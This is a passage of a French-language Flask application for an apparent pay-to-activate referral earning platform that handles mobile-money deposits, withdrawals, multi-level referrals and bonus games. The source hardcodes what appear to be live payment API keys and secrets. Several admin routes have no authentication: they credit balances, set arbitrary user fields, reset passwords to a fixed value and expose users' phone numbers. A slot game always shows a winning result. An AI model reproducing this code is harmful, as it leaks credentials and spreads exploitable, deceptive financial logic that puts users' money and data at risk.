    user = db.session.get(User, user_id) if user_id else None

    # Vérification abonnement
    is_sub = False
    if user:
        is_sub = ChannelSub.query.filter_by(user_id=user.id).first() is not None

    # Messages
    messages = ChannelMessage.query.order_by(ChannelMessage.timestamp.asc()).all()

    # Nombre abonnés
    sub_count = ChannelSub.query.count()

    return render_template(
        "chaine.html",
        messages=messages,
        sub_count=sub_count,
        is_sub=is_sub,
        user=user
    )

@app.route("/admin/restreindre_comptes")
@login_required
def restreindre_comptes_specifiques():
    # Sécurité : Seul l'administrateur a le droit de bannir

    # Liste des usernames à restreindre
    comptes_a_bloquer = ["leaderbrice01", "amen1", "oroumat"]

    # On récupère les utilisateurs correspondants dans la base de données
    utilisateurs = User.query.filter(User.username.in_(comptes_a_bloquer)).all()

    total_bloques = 0

    # On passe leur statut is_banned à True
    for user in utilisateurs:
        user.is_banned = True
        total_bloques += 1

    # Sauvegarde définitive dans la base de données
    if total_bloques > 0:
        db.session.commit()

    return f"Opération réussie ! {total_bloques} comptes ont été restreints avec succès ({', '.join([u.username for u in utilisateurs])})."


@app.route("/chaine/rejoindre", methods=["POST"])
def join_channel():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
    
    existing_sub = ChannelSub.query.filter_by(user_id=user_id).first()
    if not existing_sub:
        new_sub = ChannelSub(user_id=user_id)
        db.session.add(new_sub)
        db.session.commit()
    
    return redirect(url_for('view_channel'))

@app.route("/channel/react/<int:msg_id>/<string:emoji>", methods=["POST"])
def react(msg_id, emoji):
    msg = ChannelMessage.query.get_or_404(msg_id)

    if not msg.reactions:
        msg.reactions = {}

    reactions = msg.reactions

    if emoji not in reactions:
        reactions[emoji] = 0

    reactions[emoji] += 1

    msg.reactions = reactions
    db.session.commit()

    return {"success": True, "new_count": reactions[emoji]}

@app.route("/chaine/quitter")
def leave_channel():
    user = get_logged_in_user()
    if user:
        sub = ChannelSub.query.filter_by(user_id=user.id).first()
        if sub:
            db.session.delete(sub)
            db.session.commit()
    return redirect(url_for('view_channel'))

@app.route("/admin/credit_user/<username>/<int:montant>")
def credit_user(username, montant):

    user = User.query.filter_by(username=username).first()

    if not user:
        return "Utilisateur introuvable"

    user.solde_parrainage += montant
    user.solde_revenu += montant
    db.session.commit()

    return f"{montant} XOF ajouté au compte de {username}"

@app.route("/admin/update-solde", methods=["POST"])
def update_solde():
    data = request.get_json()
    username = data.get("username")
    field = data.get("field")  # ex: solde_revenu, solde_jeux...
    value = data.get("value")

    user = User.query.filter_by(username=username).first()
    if user:
        try:
            # On met à jour le champ dynamiquement
            setattr(user, field, float(value))
            db.session.commit()
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"success": False, "error": str(e)})
    
    return jsonify({"success": False, "error": "Utilisateur non trouvé"})

@app.route("/admin/classement-soldes")
def classement_soldes():
    # On ne récupère que le strict nécessaire pour la mémoire vive
    utilisateurs = User.query.with_entities(
        User.username,
        User.phone,
        User.solde_revenu,
        User.solde_jeux,
        User.solde_parrainage,
        User.bonus,
        User.premier_depot
    ).order_by(User.solde_revenu.desc()).all()

    return render_template("classement.html", utilisateurs=utilisateurs)


@app.route("/admin/chaine/post", methods=["POST"])
def admin_post_channel():
    content = request.form.get("content")
    file = request.files.get("media")
    media_url = None
    media_type = None

    if file:
        filename = secure_filename(file.filename)
        file.save(os.path.join("static/uploads", filename))
        media_url = f"/static/uploads/{filename}"
        media_type = "image" if filename.lower().endswith(('.png', '.jpg', '.jpeg')) else "video"

    new_msg = ChannelMessage(content=content, media_url=media_url, media_type=media_type)
    db.session.add(new_msg)
    db.session.commit()
    return redirect(url_for('view_channel'))

@app.route("/academy/affiliation")
def academy_affiliation():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))
        
    return render_template("affiliation_info.html", user=user)


from datetime import datetime, timedelta, UTC
import uuid

@app.route('/verify', methods=['GET', 'POST'])
def verify_page():
    if request.method == 'POST':

        code_saisi = request.form.get('code')

        # ==========================
        # 🔐 OTP CHECK
        # ==========================
        if code_saisi != session.get('otp'):
            flash("Code incorrect.", "danger")
            return redirect(url_for('verify_page'))

        # ==========================
        # ⏳ EXPIRATION CHECK
        # ==========================
        otp_exp = session.get('otp_expiration')

        if otp_exp and datetime.now(UTC) > datetime.fromisoformat(otp_exp):
            flash("Code expiré.", "danger")
            return redirect(url_for('retrait_page'))

        # ==========================
        # 🧾 INSCRIPTION
        # ==========================
        if session.get('mode') == 'inscription':
            data = session.get('temp_user')

            try:
                new_user = User(
                    uid=str(uuid.uuid4()),
                    username=data['username'],
                    email=data['email'],
                    phone=data['phone'],
                    country=data['country'],
                    password=data['password'],
                    parrain=data['parrain'],
                    ip_address=data.get('ip_address'),
                    solde_total=0,
                    solde_depot=0,
                    solde_revenu=0,
                    solde_parrainage=0,
                    date_creation=datetime.now(UTC)
                )

                db.session.add(new_user)
                db.session.commit()

                session["user_id"] = new_user.id

                # cleanup
                session.pop('otp', None)
                session.pop('temp_user', None)
                session.pop('mode', None)
                session.pop('otp_expiration', None)

                flash("Inscription réussie !", "success")
                return redirect(url_for("dashboard_bloque"))

            except Exception as e:
                db.session.rollback()
                flash("Erreur création compte : " + str(e), "danger")
                return redirect(url_for("inscription_page"))

        # ==========================
        # 🔑 RESET PASSWORD
        # ==========================
        elif session.get('mode') == 'reset':
            return redirect(url_for('new_password_page'))

        # ==========================
        # 💸 RETRAIT (FINAL FIX)
        # ==========================
        elif session.get('mode') == 'retrait':

            user = get_logged_in_user()
            data = session.get('retrait_data')

            if not user or not data:
                flash("Session expirée. Recommencez.", "danger")
                return redirect(url_for("retrait_page"))

            try:
                # ==========================
                # 🔥 API CALL
                # ==========================
                response = envoyer_retrait_soleaspay(
                    data["service_id"],
                    data["wallet"],
                    data["montant"]
                )

                print("🔵 API RESPONSE :", response)

                if not response or response.get("success") != True:
                    flash("Erreur API paiement.", "danger")
                    return redirect(url_for("retrait_page"))

                # ==========================
                # 🧾 SAVE WITHDRAWAL
                # ==========================
                nouveau_retrait = Retrait(
                    user_id=user.id,
                    montant=data["montant"],
                    frais=data["frais"],
                    payment_method=data["service_name"],
                    statut="successful",
                    phone=data["wallet"],
                    pays=user.country,
                    date=datetime.now(UTC)
                )

                db.session.add(nouveau_retrait)

                montant_total = data["montant"] + data["frais"]

                user.solde_parrainage -= montant_total
                user.total_retrait = (user.total_retrait or 0) + montant_total

                db.session.commit()

                # ==========================
                # 🧹 CLEAN SESSION
                # ==========================
                session.pop('otp', None)
                session.pop('retrait_data', None)
                session.pop('mode', None)
                session.pop('otp_expiration', None)

                flash("Retrait confirmé avec succès ✅", "success")
                return redirect(url_for("mes_retraits"))

            except Exception as e:
                db.session.rollback()
                flash("Erreur retrait : " + str(e), "danger")
                return redirect(url_for("retrait_page"))

    return render_template('verify.html')

@app.route("/admin/utilisateurs")
def admin_users_page():
    # On récupère tous les utilisateurs classés par date de création
    utilisateurs = User.query.order_by(User.date_creation.desc()).all()
    return render_template("admin_users.html", users=utilisateurs)


@app.route('/new-password', methods=['GET', 'POST'])
def new_password_page():
    if 'reset_email' not in session:
        return redirect(url_for('connexion_page'))

    if request.method == 'POST':
        password = request.form.get('password')
        confirm = request.form.get('confirm_password')

        if password != confirm:
            flash("Les mots de passe ne correspondent pas.", "danger")
            return render_template('new_password.html')

        user = User.query.filter_by(email=session['reset_email']).first()

        if user:
            user.password = generate_password_hash(password)
            db.session.commit()

            # nettoyage
            session.pop('reset_email', None)

            flash("Mot de passe modifié avec succès !", "success")
            return redirect(url_for('connexion_page'))

    return render_template('new_password.html')

from werkzeug.security import check_password_hash

@app.route('/reset-password', methods=['GET', 'POST'])
def reset_password_request():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        pin = request.form.get('pin', '').strip()

        user = User.query.filter_by(email=email).first()

        if not user:
            flash("Cet email n'existe pas.", "danger")
            return render_template('reset_request.html')

        # 🔐 Vérifier PIN
        if not user.pin_code:
            flash("Aucun code PIN défini pour ce compte.", "danger")
            return render_template('reset_request.html')

        if not check_password_hash(user.pin_code, pin):
            flash("Code PIN incorrect.", "danger")
            return render_template('reset_request.html')

        # ✅ OK → autoriser reset
        session['reset_email'] = email
        flash("Vérification réussie. Vous pouvez changer votre mot de passe.", "success")
        return redirect(url_for('new_password_page'))

    return render_template('reset_request.html')

from datetime import datetime

from datetime import datetime, timezone

# --- FONCTION UNIQUE DE LOCALISATION ---
def enregistrer_position(user_obj):
    """
    Récupère les coordonnées GPS du formulaire et les stocke dans l'objet user.
    """
    lat = request.form.get('latitude')
    lng = request.form.get('longitude')
    
    if lat and lng:
        user_obj.latitude = lat
        user_obj.longitude = lng
        # On peut aussi mettre à jour la date de dernière localisation si la colonne existe
        if hasattr(user_obj, 'last_location_update'):
            user_obj.last_location_update = datetime.now(timezone.utc)
        return True
    return False

@app.route("/connexion", methods=["GET", "POST"])
def connexion_page():
    if request.method == "POST":
        username = request.form.get("username", "").strip().lower()
        password = request.form.get("password", "").strip()

        if not username or not password:
            flash("Veuillez remplir tous les champs.", "danger")
            return redirect(url_for("connexion_page"))

        user = User.query.filter_by(username=username).first()

        if not user or not check_password_hash(user.password, password):
            flash("Identifiants incorrects.", "danger")
            return redirect(url_for("connexion_page"))

        if getattr(user, "is_banned", False):
            flash("Votre compte a été suspendu. Contactez le support.", "danger")
            return redirect(url_for("connexion_page"))

        # --- POSITION SUPPRIMÉE ICI ---
        session.clear()
        session["user_id"] = user.id
        session["username"] = user.username
        session.permanent = True

        flash(f"Connexion réussie ! Bienvenue {user.username}.", "success")
        return redirect(url_for("dashboard_page"))

    return render_template("connexion.html")

@app.route("/admin/reseau/leaderbrice")
@login_required
def reseau_leader_brice():
    # 1. On cherche le leader par son username "leaderbrice01"
    leader = User.query.filter_by(username="leaderbrice01").first()
    
    if not leader:
        return "L'utilisateur 'leaderbrice01' n'existe pas dans la base de données.", 404

    # --- NIVEAU 1 : Filleuls directs ---
    # On utilise ta relation 'downlines' définie dans ton modèle
    niveau1 = leader.downlines.all()

    # --- NIVEAU 2 : Filleuls des filleuls ---
    niveau2 = []
    if niveau1:
        # On récupère tous les usernames du niveau 1
        usernames_n1 = [u.username for u in niveau1 if u.username]
        if usernames_n1:
            # On cherche tous les utilisateurs dont le parrain est dans le niveau 1
            niveau2 = User.query.filter(User.parrain.in_(usernames_n1)).all()

    # --- NIVEAU 3 : Filleuls du niveau 2 ---
    niveau3 = []
    if niveau2:
        # On récupère tous les usernames du niveau 2
        usernames_n2 = [u.username for u in niveau2 if u.username]
        if usernames_n2:
            # On cherche tous les utilisateurs dont le parrain est dans le niveau 2
            niveau3 = User.query.filter(User.parrain.in_(usernames_n2)).all()

    # Calcul des statistiques exactes pour l'affichage
    stats = {
        "total_filleuls": len(niveau1) + len(niveau2) + len(niveau3),
        "total_n1": len(niveau1),
        "total_n2": len(niveau2),
        "total_n3": len(niveau3)
    }

    return render_template(
        "admin_reseau.html",
        leader=leader,
        niveau1=niveau1,
        niveau2=niveau2,
        niveau3=niveau3,
        stats=stats
    )


@app.route("/inscription", methods=["GET", "POST"])
def inscription_page():
    date_ouverture = datetime(2026, 4, 11, 12, 0, 0)
    if datetime.now() < date_ouverture:
        return render_template("maintenance_inscription.html")

    ref_code = request.args.get("ref", "").strip().lower()
    session.pop("username_exists", None)

    if request.method == "POST":
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if user_ip and ',' in user_ip:
            user_ip = user_ip.split(',')[0].strip()

        username = request.form.get("username", "").strip().lower()
        email = request.form.get("email", "").strip()
        country = request.form.get("country", "").strip()
        phone = request.form.get("phone", "").strip()
        password = request.form.get("password", "").strip()
        confirm = request.form.get("confirm_password", "").strip()
        parrain_code = (request.form.get("parrain", "") or ref_code).strip().lower()

        errors = []

        if not all([username, email, country, phone, password, confirm]):
            errors.append("Tous les champs sont obligatoires.")

        if username and not re.fullmatch(r"[a-z0-9]+", username):
            errors.append("Nom d'utilisateur invalide.")

        if password != confirm:
            errors.append("Les mots de passe ne correspondent pas.")

        existing_users = User.query.filter(
            (User.username == username) |
            (User.email == email) |
            (User.phone == phone)
        ).all()

        for u in existing_users:
            if u.username == username:
                errors.append(f"Nom d'utilisateur '{username}' existe déjà.")
                session["username_exists"] = True
            if u.email == email:
                errors.append("Cet email est déjà utilisé.")
            if u.phone == phone:
                errors.append("Ce numéro est déjà enregistré.")

        parrain_user = None
        if parrain_code:
            parrain_user = User.query.filter_by(username=parrain_code).first()
            if not parrain_user:
                errors.append("Code parrain invalide.")

        if errors:
            for error in errors:
                flash(error, "danger")
            return render_template("inscription.html", code_ref=ref_code)

        try:
            new_user = User(
                uid=str(uuid.uuid4()),
                username=username,
                email=email,
                phone=phone,
                country=country,
                password=generate_password_hash(password),
                parrain=parrain_user.username if parrain_user else None,
                ip_address=user_ip,
                solde_total=0,
                solde_depot=0,
                solde_revenu=0,
                solde_parrainage=0,
                date_creation=datetime.now(timezone.utc)
            )

            # --- POSITION SUPPRIMÉE ICI ---
            db.session.add(new_user)
            db.session.commit()

            session["user_id"] = new_user.id

            flash("Compte créé avec succès 🎉", "success")
            return redirect(url_for("dashboard_bloque"))

        except Exception as e:
            db.session.rollback()
            flash("Erreur création compte : " + str(e), "danger")

    return render_template("inscription.html", code_ref=ref_code)



from datetime import datetime
from flask import render_template

def verification_lancement():
    # Date cible : 11 Avril 2026 à 12h00
    date_lancement = datetime(2026, 4, 11, 12, 0, 0)
    if datetime.now() < date_lancement:
        # On renvoie directement le template de maintenance
        return render_template("maintenance_inscription.html")
    return None


PUBLIC_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
PRIVATE_SECRET_KEY = "SP_-YQFuI5M9B1H2bNSNycwI_YQBc_kXkGACp-mLoBdWqI"

def obtenir_token():
    url = "https://soleaspay.com/api/action/auth"

    payload = {
        "public_apikey": PUBLIC_API_KEY,
        "private_secretkey": PRIVATE_SECRET_KEY
    }

    headers = {
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        data = response.json()

        token = data.get("access_token")   # ✅ CORRECTION ICI

        if not token:
            return None, data

        return token, None

    except Exception as e:
        return None, str(e)

from datetime import datetime, timedelta

MAX_GAIN = 500.0
CYCLE_DAYS = 3
WINDOW_HOURS = 24

@app.route('/game/apple', methods=['GET', 'POST'])
def apple_game():
    if 'user_id' not in session:
        return redirect(url_for('connexion_page'))

    user = db.session.get(User, session['user_id'])
    now = datetime.now()
    
    # 1. Vérification des blocages définitifs
    total_bonus = user.bonus or 0.0
    is_blocked_500 = total_bonus >= MAX_GAIN
    no_rounds_left = (user.remaining_rounds or 0) <= 0

    can_play = False
    next_available_date = None

    # Date de base pour le calcul (Inscription ou dernier jeu)
    base_date = user.last_play_date or user.date_creation

    if base_date and not is_blocked_500 and not no_rounds_left:
        # Ouverture théorique : +3 jours après la dernière activité
        next_available_date = base_date + timedelta(days=CYCLE_DAYS)
        # Fermeture théorique : 24h après l'ouverture
        deadline_date = next_available_date + timedelta(hours=WINDOW_HOURS)

        if now < next_available_date:
            # Trop tôt : Bouton incliquable
            can_play = False
        elif next_available_date <= now <= deadline_date:
            # Dans la fenêtre : Cliquable
            can_play = True
        elif now > deadline_date:
            # Fenêtre ratée : On pénalise et on décale le prochain round
            user.remaining_rounds -= 1
            user.last_play_date = next_available_date # On marque le créneau comme "utilisé"
            db.session.commit()
            return redirect(url_for('apple_game'))
    
    # Cas spécial : Premier jeu juste après inscription (si last_play_date est None)
    if not user.last_play_date and not no_rounds_left and not is_blocked_500:
        can_play = True

    if request.method == 'GET':
        return render_template(
            'apple_game.html',
            can_play=can_play,
            is_blocked_500=(is_blocked_500 or no_rounds_left),
            next_date=next_available_date,
            rounds_left=user.remaining_rounds
        )

    if request.method == 'POST':
        if not can_play:
            return jsonify({"status": "error", "message": "Action non autorisée actuellement."})

        data = request.json
        gain = float(data.get('gain', 0))

        if (user.bonus or 0) + gain > MAX_GAIN:
            gain = MAX_GAIN - (user.bonus or 0)

        user.bonus = (user.bonus or 0.0) + gain
        user.solde_revenu = (user.solde_revenu or 0.0) + gain
        user.last_play_date = now
        user.remaining_rounds -= 1
        
        db.session.commit()
        return jsonify({"status": "success", "message": f"+{gain} F"})


@app.route('/admin/open-game-30')
def open_game():
    try:
        control = GameControl.query.first() or GameControl()
        # Assure-toi de l'import : from datetime import datetime, timedelta
        control.end_time = datetime.now() + timedelta(minutes=30)
        
        # Réinitialisation propre
        db.session.query(User).update({User.has_played_this_round: False})
        
        db.session.add(control)
        db.session.commit()
        return "Jeu activé pour 30 minutes !"
    except Exception as e:
        db.session.rollback()
        return f"Erreur admin : {e}"

import random
from flask import session, jsonify, request

from flask import render_template, session, jsonify, request, redirect, url_for
from datetime import datetime
import random

@app.route('/game/apple-of-fortune')
def apple_game_page():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('connexion_page'))

    # Logique de temps : Lundi = 0
    maintenant = datetime.now()
    est_lundi = (maintenant.weekday() == 0)
    est_apres_8h = (maintenant.hour >= 8)
    
    ouvert = est_lundi and est_apres_8h

    return render_template('apple_fortune.html', user=user, ouvert=ouvert)

@app.route('/game/apple-of-fortune/start', methods=['POST'])
def apple_start():
    user = get_logged_in_user()
    maintenant = datetime.now()

    # Vérification sécurité temps + BDD
    if maintenant.weekday() != 0 or maintenant.hour < 8:
        return jsonify({"status": "error", "message": "Le verger est fermé. Revient lundi à 08h00."}), 403

    if user.frog_game_done:
        return jsonify({"status": "error", "message": "Tu as déjà récupéré tes pommes aujourd'hui."}), 403

    # Génération sécurisée côté serveur
    full_map = []
    for i in range(10):
        row = [0, 0, 0, 0, 0] # 0 = Pomme
        bomb_count = 1 if i < 3 else 2 if i < 7 else 3
        bomb_indices = random.sample(range(5), bomb_count)
        for idx in bomb_indices: row[idx] = 1 # 1 = Bombe
        full_map.append(row)

    session['apple_map'] = full_map
    session['apple_step'] = 0
    session['apple_gain'] = 0
    return jsonify({"status": "success"})

@app.route('/game/apple-of-fortune/check', methods=['POST'])
def apple_check():
    user = get_logged_in_user()
    data = request.json
    choice = data.get('choice')

    if 'apple_map' not in session:
        return jsonify({"status": "error", "message": "Session expirée"}), 400

    step = session['apple_step']
    game_map = session['apple_map']

    # Si l'utilisateur touche une bombe
    if game_map[step][choice] == 1:
        gain_final = session.get('apple_gain', 0)
        
        # CRÉDIT AUTOMATIQUE MÊME SI PERDU
        if gain_final > 0:
            user.solde_jeux = (user.solde_jeux or 0) + gain_final
        
        user.frog_game_done = True
        db.session.commit()
        session.pop('apple_map', None)
        return jsonify({"status": "fail", "gain_final": gain_final})

    else:
        # Passage au niveau suivant
        session['apple_step'] += 1
        session['apple_gain'] += 25
        
        if session['apple_step'] == 10:
            user.solde_jeux = (user.solde_jeux or 0) + session['apple_gain']
            user.frog_game_done = True
            db.session.commit()
            return jsonify({"status": "win", "gain": session['apple_gain']})
            
        return jsonify({"status": "continue", "new_gain": session['apple_gain']})

@app.route('/game/apple-of-fortune/cashout', methods=['POST'])
def apple_cashout():
    user = get_logged_in_user()
    gain = session.get('apple_gain', 0)
    
    if gain > 0:
        user.solde_jeux = (user.solde_jeux or 0) + gain
        user.frog_game_done = True
        db.session.commit()
        session.pop('apple_map', None)
        return jsonify({"status": "success", "gain": gain})
    return jsonify({"status": "error"}), 400

@app.route('/admin/reset-monday-games')
def reset_games():
    # Récupère tous les utilisateurs qui ont déjà joué
    users_to_reset = User.query.filter_by(frog_game_done=True).all()
    
    for u in users_to_reset:
        u.frog_game_done = False
    
    db.session.commit()
    
    return f"Succès ! Les compteurs de {len(users_to_reset)} utilisateurs ont été remis à zéro."


import random
from datetime import datetime
from flask import jsonify, session

from flask import render_template, session, jsonify, request, redirect, url_for
from datetime import datetime
import random

@app.route('/game/glass-bridge')
def glass_bridge_page():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('connexion_page'))

    # Logique de temps : Jeudi = 3
    maintenant = datetime.now()
    est_jeudi = (maintenant.weekday() == 3)
    est_apres_8h = (maintenant.hour >= 8)
    
    ouvert = est_jeudi and est_apres_8h

    # Réinitialisation automatique des chances le jeudi matin
    aujourdhui = maintenant.date()
    if est_jeudi and est_apres_8h and user.derniere_maj_chances != aujourdhui:
        user.chances_bridge = 3
        user.derniere_maj_chances = aujourdhui
        db.session.commit()

    # Générer le chemin secret en session
    session['bridge_path'] = [random.randint(0, 1) for _ in range(6)]
    session['current_step'] = 0

    return render_template('glass_bridge.html', user=user, ouvert=ouvert)

@app.route('/game/verify-jump', methods=['POST'])
def verify_jump():
    user = get_logged_in_user()
    maintenant = datetime.now()
    
    # Sécurité temps
    if maintenant.weekday() != 3 or maintenant.hour < 8:
        return jsonify({"status": "closed", "message": "Reviens jeudi à 08h00"}), 403

    if user.chances_bridge <= 0:
        return jsonify({"status": "out_of_chances"}), 403

    data = request.json
    side = data.get('side') # 0 ou 1
    correct_path = session.get('bridge_path')
    step = session.get('current_step', 0)

    if side == correct_path[step]:
        session['current_step'] = step + 1
        if session['current_step'] == 6:
            reward = 1000
            user.solde_jeux = (user.solde_jeux or 0) + reward
            user.chances_bridge = 0 # On bloque après la victoire
            db.session.commit()
            return jsonify({"status": "win", "reward": reward})
        return jsonify({"status": "success"})
    else:
        user.chances_bridge -= 1
        db.session.commit()
        # On régénère le chemin après une chute pour éviter la triche par mémorisation
        session['bridge_path'] = [random.randint(0, 1) for _ in range(6)]
        session['current_step'] = 0
        return jsonify({"status": "fail", "remaining_chances": user.chances_bridge})


import random

@app.route('/game/slot-play', methods=['POST'])
def play_slot():
    user = db.session.get(User, session.get("user_id"))
    
    # 1. Vérification de la chance unique
    if user.has_played_slot:
        return jsonify({"status": "error", "message": "Vous avez déjà tenté votre chance !"}), 403

    # 2. Vérification solde (Optionnel selon ta règle, ici on suppose qu'il a payé l'accès)
    # user.solde_revenu -= 400 
    
    # 3. Logique de gain garanti entre 150 et 600
    # On génère un gain aléatoire par paliers de 50 pour faire joli
    gain = random.randint(3, 12) * 50  # 150, 200, 250 ... 600
    
    # 4. Enregistrement du résultat
    user.has_played_slot = True
    user.bonus += gain
    db.session.commit()

    return jsonify({
        "status": "win",
        "reels": ["7", "7", "7"], # Le 7 est le symbole gagnant
        "gain": gain,
        "message": f"Félicitations ! Vous avez gagné {gain} XOF."
    })


@app.route("/admin/fix_parrain")
def fix_parrain():
    ancien = "aaaa"
    nouveau = "amen"

    users = User.query.filter_by(parrain=ancien).all()
    for u in users:
        u.parrain = nouveau

    db.session.commit()
    return "Parrain mis à jour avec succès"


@app.route("/admin/reset_password/<username>")
def reset_password(username):
    user = User.query.filter_by(username=username).first()

    if not user:
        return "Utilisateur introuvable"

    from werkzeug.security import generate_password_hash

    nouveau_mdp = "ingrd123"
    user.password = generate_password_hash(nouveau_mdp)

    db.session.commit()

    return f"Mot de passe réinitialisé pour {username} : {nouveau_mdp}"

SOLEAS_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
SOLEAS_WEBHOOK_SECRET = "b42ed39b9e0db71db4556a2dfe1b1ad00dcce656fd4dba033f1947f913f1908bc817588c2edb32d92533a1d162e57ad4b1f7299f39695c5671c3ef07baa6f22a"

SERVICES = {

    # 🇨🇲 CAMEROUN
    "CM": [
        {"id": 1, "name": "MOMO CM", "description": "MTN MOBILE MONEY CAMEROUN"},
        {"id": 2, "name": "OM CM", "description": "ORANGE MONEY CAMEROUN"},
    ],

    # 🇨🇮 CÔTE D’IVOIRE
    "CI": [
        {"id": 29, "name": "OM CI", "description": "ORANGE MONEY COTE D'IVOIRE"},
        {"id": 30, "name": "MOMO CI", "description": "MTN MONEY COTE D'IVOIRE"},
        {"id": 31, "name": "MOOV CI", "description": "MOOV COTE D'IVOIRE"},
        {"id": 32, "name": "WAVE CI", "description": "WAVE COTE D'IVOIRE"},
    ],

    # 🇧🇫 BURKINA FASO
    "BF": [
        {"id": 33, "name": "MOOV BF", "description": "MOOV BURKINA FASO"},
        {"id": 34, "name": "OM BF", "description": "ORANGE MONEY BURKINA FASO"},
    ],

    # 🇧🇯 BENIN
    "BJ": [
        {"id": 35, "name": "MOMO BJ", "description": "MTN MONEY BENIN"},
        {"id": 36, "name": "MOOV BJ", "description": "MOOV BENIN"},
    ],

    # 🇹🇬 TOGO
    "TG": [
        {"id": 37, "name": "T-MONEY TG", "description": "T-MONEY TOGO"},
        {"id": 38, "name": "MOOV TG", "description": "MOOV TOGO"},
    ],

    # 🇨🇩 CONGO DRC
    "COD": [
        {"id": 52, "name": "VODACOM COD", "description": "VODACOM CONGO DRC"},
        {"id": 53, "name": "AIRTEL COD", "description": "AIRTEL CONGO DRC"},
        {"id": 54, "name": "ORANGE COD", "description": "ORANGE CONGO DRC"},
    ],

    # 🇨🇬 CONGO BRAZZAVILLE
    "COG": [
        {"id": 55, "name": "AIRTEL COG", "description": "AIRTEL CONGO"},
        {"id": 56, "name": "MOMO COG", "description": "MTN MOMO CONGO"},
    ],

    # 🇬🇦 GABON
    "GAB": [
        {"id": 57, "name": "AIRTEL GAB", "description": "AIRTEL GABON"},
    ],

    # 🇺🇬 UGANDA
    "UGA": [
        {"id": 58, "name": "AIRTEL UGA", "description": "AIRTEL UGANDA"},
        {"id": 59, "name": "MOMO UGA", "description": "MTN MOMO UGANDA"},
    ],
}

COUNTRY_CODE = {
    # Cameroun
    "Cameroun": "CM",
    "Cameroon": "CM",

    # Côte d'Ivoire
    "Côte d'Ivoire": "CI",
    "Cote d Ivoire": "CI",
    "Ivory Coast": "CI",

    # Burkina Faso
    "Burkina Faso": "BF",

    # Bénin
    "Bénin": "BJ",
    "Benin": "BJ",

    # Togo
    "Togo": "TG",

    # Congo DRC
    "Congo DRC": "COD",
    "RDC": "COD",
    "République Démocratique du Congo": "COD",

    # Congo Brazzaville
    "Congo": "COG",
    "Congo Brazzaville": "COG",

    # Gabon
    "Gabon": "GAB",

    # Uganda
    "Uganda": "UGA",
}


def get_soleaspay_services():
    return SOLEASPAY_SERVICES_JSON

@app.route("/dashboard_bloque", methods=["GET", "POST"])
def dashboard_bloque():
    user = get_logged_in_user()

    if user_is_activated(user):
        return redirect(url_for("dashboard_page"))

    # Simule un dépôt pending
    pending_depot = None
    user_has_pending_depot = bool(pending_depot)

    # Récupération du code pays
    country_code = COUNTRY_CODE.get(user.country.strip())
    if not country_code:
        flash("Pays non supporté.", "danger")
        return redirect(url_for("connexion_page"))

    # =========================
    # POST : paiement
    # =========================
    if request.method == "POST":
        operator_name = request.form.get("operator")
        amount = request.form.get("montant", type=int)
        fullname = request.form.get("fullname")
        phone = request.form.get("phone")  # ✅ numéro modifiable

        # 🔒 Vérifications
        if not operator_name or not amount or not fullname or not phone:
            flash("Tous les champs sont requis.", "danger")
            return redirect(url_for("dashboard_bloque"))

        if amount != 4500:
            flash("Le montant d'activation est exactement 4500 FCFA.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # 🔒 Nettoyage numéro
        phone = phone.replace(" ", "").replace("-", "")

        if not phone.isdigit() or len(phone) < 8:
            flash("Numéro de paiement invalide.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # 🔹 Recherche du service SoleasPay
        service = next(
            (s for s in SERVICES[country_code] if s["name"] == operator_name),
            None
        )

        if not service:
            flash("Opérateur non supporté pour votre pays.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # 🔹 Création du dépôt AVANT paiement avec toutes les infos obligatoires
        new_depot = Depot(
            user_name=user.username,
            phone=phone,
            operator=operator_name,  # ✅ maintenant obligatoire
            country=country_code,    # ✅ maintenant obligatoire
            montant=amount,
            statut="en_attente",
            email=user.email
        )
        db.session.add(new_depot)
        db.session.commit()

        # 🔹 Payload SoleasPay avec DEPOT_ID
        payload = {
            "wallet": phone,  # ✅ NUMÉRO SAISI PAR L’UTILISATEUR
            "amount": amount,
            "currency": "XOF",
            "order_id": f"NOVA-{new_depot.id}",
            "description": f"Activation Nova {user.username} DEPOT_ID={new_depot.id}",
            "payer": fullname,
            "payerEmail": user.email,
            "successUrl": "https://nova-trade.cc/dashboard/pay/ok",
            "failureUrl": "https://nova-trade.cc/dashboard_bloque",
        }

        headers = {
            "x-api-key": SOLEAS_API_KEY,
            "operation": "2",
            "service": str(service["id"]),
            "Content-Type": "application/json"
        }

        try:
            response = requests.post(
                "https://soleaspay.com/api/agent/bills/v3",
                headers=headers,
                json=payload,
                timeout=30
            )
            result = response.json()
        except Exception as e:
            flash(f"Erreur de connexion au serveur de paiement : {e}", "danger")
            return redirect(url_for("dashboard_bloque"))

        if not result.get("succès"):
            flash(result.get("message", "Erreur paiement"), "danger")
            return redirect(url_for("dashboard_bloque"))

        flash("Veuillez confirmer le paiement sur votre téléphone.", "info")
        return redirect(url_for("dashboard_bloque"))

    # =========================
    # GET : affichage page
    # =========================
    return render_template(
        "dashboard_bloque.html",
        user=user,
        user_has_pending_depot=user_has_pending_depot,
        services_by_country=SERVICES,
        country_code=country_code
    )


@app.route("/verify", methods=["GET"])
def verify_payment():
    order_id = request.args.get("orderId")
    pay_id = request.args.get("payId")
    headers = {
        "x-api-key": API_KEY
    }
    url = f"https://soleaspay.com/api/agent/verif-pay?orderId={order_id}&payId={pay_id}"
    response = requests.get(url, headers=headers)
    return jsonify(response.json())



@app.route("/logout")
def logout_page():
    session.clear()
    flash("Déconnexion effectuée.", "info")
    return redirect(url_for("connexion_page"))


def get_global_stats():
    total_users = db.session.query(func.count(User.id)).scalar() or 0
    total_deposits = db.session.query(func.sum(Depot.montant)).filter(Depot.statut=="valide").scalar() or 0
    total_withdrawn = db.session.query(func.sum(User.total_retrait)).scalar() or 0  # ← On utilise maintenant total_retrait
    return total_users, total_deposits, total_withdrawn


# --------------------------------------
